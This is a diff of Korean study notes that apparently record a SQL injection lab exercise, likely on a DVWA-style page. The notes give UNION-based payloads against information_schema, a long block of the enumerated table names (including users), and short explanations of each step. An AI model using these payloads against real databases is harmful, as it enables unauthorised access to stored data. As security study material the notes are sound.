@@ -29,4 +29,225 @@
 - ![[Pasted image 20241008111046.png]]`5' union select 1,@@version#`![[Pasted image 20241008111131.png]]
 - 버전을 검색해서 DB 정보를 획득할 수 있다.![[Pasted image 20241008111243.png]]
 - DB 정보와 버전을 알면 취약점을 찾을 수 있다.![[Pasted image 20241008111340.png]]
-- `5' union select 1,table_name from information_schema` = 
+- `5' union select table_schema,2 from information_schema.tables#` > 데이터 테이블 구조를 1번 칼럼에 출력하고 스키마의 테이블 수를 출력해라 는 명령어![[Pasted image 20241008112310.png]]
+  (첫번째 출력은 5번째 사용자 이름을 출력하는 내용)
+- `5' union select 1,table_name from information_schema.tables#` > 스키마에서 테이블 이름을 가져오는 sql 구문
+	```
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: Bob  
+	Surname: Smith
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: CHARACTER_SETS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: COLLATIONS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: COLLATION_CHARACTER_SET_APPLICABILITY
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: COLUMNS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: COLUMN_PRIVILEGES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: ENGINES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: EVENTS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: FILES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: GLOBAL_STATUS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: GLOBAL_VARIABLES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: KEY_COLUMN_USAGE
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: PARTITIONS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: PLUGINS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: PROCESSLIST
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: PROFILING
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: REFERENTIAL_CONSTRAINTS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: ROUTINES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: SCHEMATA
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: SCHEMA_PRIVILEGES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: SESSION_STATUS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: SESSION_VARIABLES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: STATISTICS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: TABLES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: TABLE_CONSTRAINTS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: TABLE_PRIVILEGES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: TRIGGERS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: USER_PRIVILEGES
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: VIEWS
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: guestbook
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: users
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: columns_priv
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: db
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: event
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: func
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: general_log
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: help_category
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: help_keyword
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: help_relation
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: help_topic
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: host
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: ndb_binlog_index
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: plugin
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: proc
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: procs_priv
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: servers
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: slow_log
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: tables_priv
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: time_zone
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: time_zone_leap_second
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: time_zone_name
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: time_zone_transition
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: time_zone_transition_type
+	
+	ID: 5' union select 1,table_name from information_schema.tables#  
+	First name: 1  
+	Surname: user
+	```
+	- table_name에는 DB에 사용되는 table들의 이름들이 모두 저장되도록 sql에서 기본 설정되어 있기 때문에 사용자가 임의의 작업을 하지 않았다면 테이블 이름들을 확인 할 수 있다.
+- `5' union select 1,table_name from information_schema.tables where#`
